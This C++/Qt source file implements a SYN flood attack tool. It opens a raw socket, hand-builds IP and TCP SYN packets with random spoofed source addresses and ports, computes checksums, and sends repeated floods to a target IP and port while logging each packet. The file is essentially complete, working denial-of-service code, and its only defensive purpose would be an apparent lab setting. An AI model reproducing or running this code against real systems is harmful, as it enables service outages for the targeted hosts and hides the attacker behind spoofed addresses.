#include "synflood.h"


u_int16_t check_sum(u_int16_t *buffer, int size);

SynFlood::SynFlood()
{
    srandom(time(nullptr));
    QDateTime dateTime;
    dateTime = QDateTime::currentDateTime();
    syn_msg = "--------SYN Flood Information--------\n";
    syn_msg += dateTime.toString("yyyy-MM-dd hh:mm:ss\n");
}

SynFlood::~SynFlood()
{
    ip_header = nullptr;
    tcp_header = nullptr;
}

/*SynFlood initiate*/
int SynFlood::init(std::string ip_addr, int port)
{
    // initiate the ip and port for object
    this->ip_addr = ip_addr;
    this->port = port;
    desip = QString::fromStdString(ip_addr);
    int res = initRawSocket();
    if(res!=0){
        return -1;
    }

    initIpData();
    return 0;
}

/*create rawSocket*/
int SynFlood::initRawSocket()
{
    // create address message
    addr.sin_family = AF_INET;// ipv4 family
    addr.sin_addr.s_addr = inet_addr(ip_addr.c_str());
    addr.sin_port = htons(port);

    // create a socket,TCP
    socket_fd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    if(socket_fd<0){
        perror("socket:");
        return -1;
    }
    qDebug() << "sock:" << socket_fd  << endl;
    syn_msg += QString("Already create a socket called:%1.\n").arg(socket_fd);
    // Prevent automatic filling of packages
    int on = 1;
    int opt =  setsockopt(socket_fd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on));
    if(opt<0){
        perror("opt:");
        return -1;
    }
    return 0;
}

/*initiate ip数据报*/
int SynFlood::initIpData()
{
    // ip_datagram(IP header + TCP header + TCP data)
    memset(&ip_datagram,0,sizeof(ip_datagram));
//    qDebug()<< "ip_datagram size :" << ip_datagram_len << endl;
    syn_msg += QString("Make a %1 size IP data packet.\n").arg(ip_datagram_len);

    ip_header = (struct ip *)ip_datagram;
    tcp_header = (struct tcphdr *)(ip_datagram + sizeof(struct ip));
    // ip header
    // version 4
    ip_header->ip_v = IPVERSION;
    // header_length 4
    ip_header->ip_hl = sizeof(struct ip)>>2;
    // (types of service) 8
    ip_header->ip_tos = 0;
    // total length 16
    //htons() Convert host byte order to network byte order
    ip_header->ip_len = htons(ip_datagram_len);
    // id 16
    ip_header->ip_id = 0;
    // flag + offset 16
    ip_header->ip_off = 0;
    // time to live 8
    ip_header->ip_ttl = 0;
    // protocol 8  TCP protocol --value==6
    ip_header->ip_p = IPPROTO_TCP;
    // checksum in header 16
    ip_header->ip_sum = 0;
    // source ip/fake? 32
    //ip_header->ip_src.s_addr = inet_addr("127.0.0.1");
    // sockaddr_in addr -->(sin_addr,sin_port)
    // destination 32  A binary IPv4 address is stored in addr.sin_addr
    ip_header->ip_dst = addr.sin_addr;

    //tcp header
    // source port 16 //fake?
    //tcp_header->source = htons(m_port);
    // destination port 16
    tcp_header->dest = addr.sin_port;
    // sequence 32
    tcp_header->seq = 0;
    // ACK 32
    tcp_header->ack_seq = 0;
    // offset of data 4
    //tcp_header->res1 = 0;
    // save 4
    tcp_header->doff = 5;
    //res2+urg+ack+psh+rst+syn+fin 8
    //tcp_header->res2 = 0;
    //tcp_header->urg = 0;
    //tcp_header->ack = 0;
    //tcp_header->psh = 0;
    //tcp_header->rst = 0;
    tcp_header->syn = 1;
    //tcp_header->fin = 0;
    // window size 16
    //tcp_header->window = 0;
    // checksum 16
    tcp_header->check = 0;
    // urgent pointer 16
    //tcp_header->urg_ptr = 0;
    return 0;
}


/*syn攻击*/
int SynFlood::attack(int flood_times)
{
    /*synFlood*/
    for(int i = 0 ; i < flood_times ; i++){
        // fake src ip
        u_int32_t m_ip = random();
        ip_header->ip_src.s_addr = htonl(m_ip);
        // fake src port
        tcp_header->source = htons(random());
//        qDebug() << "Fake ip:" << inet_ntoa(ip_header->ip_src) << "Fake port:" << tcp_header->source << endl;
        syn_msg += QString("Sender Host from:[%1],port:[%2]\n------sends a TCP packet for SYN to-----\nTarget Host from[%3],port[%4]\n")
                .arg(inet_ntoa(ip_header->ip_src)).arg(tcp_header->source).arg(desip).arg(port);

        QStringList temp = {QString("%1").arg(inet_ntoa(ip_header->ip_src)),QString("%1").arg(desip),QString("%1").arg(tcp_header->source),QString("%1").arg(port),QString("%1").arg(ip_datagram_len),"SYN"};
        syn_table.append(temp);
//        qDebug()<<"temp_syn_table"<<syn_table;

        /*Calculate tcp checksum*/
        ip_header->ip_ttl = 0;
        tcp_header->check = 0;
        // The checksum of the IP header will be automatically calculated by the kernel. It can be used as the pseudo header first to store the tcp length
        ip_header->ip_sum = htons(sizeof(struct tcphdr));
        // Calculate the tcp checksum, starting from the pseudo header
        tcp_header->check = check_sum((u_int16_t *)ip_datagram+4,sizeof(ip_datagram)-8);

        ip_header->ip_ttl = MAXTTL;
        //send
        int res =  sendto(socket_fd,ip_datagram,ip_datagram_len,0,(sockaddr *)&addr,sizeof(struct sockaddr_in));
        qDebug() << res << endl;
        if(res<0){
            perror("res");
            return -1;
        }
        usleep(10000);
        if(res>0)
        {
            syn_msg += QString("SYN Flood sends successfully!\n");
        }
    }
    return 0;
}

u_int16_t check_sum(u_int16_t *buffer, int size)
{
    //It is recommended to put variables into registers to improve processing efficiency
    register int len = size;
    //16bit
    register u_int16_t *p = buffer;
    //32bit
    register u_int32_t sum = 0;

    //16bit summation
    while( len >= 2)
    {
        sum += *(p++)&0x0000ffff;
        len -= 2;
    }

    //The last single byte is directly summed
    if( len == 1){
        sum += *((u_int8_t *)p);
    }

    //Sum the high 16bit and low 16bit until the high 16bit is 0
    while((sum&0xffff0000) != 0){
        sum = (sum>>16) + (sum&0x0000ffff);
    }
    return (u_int16_t)(~sum);
}
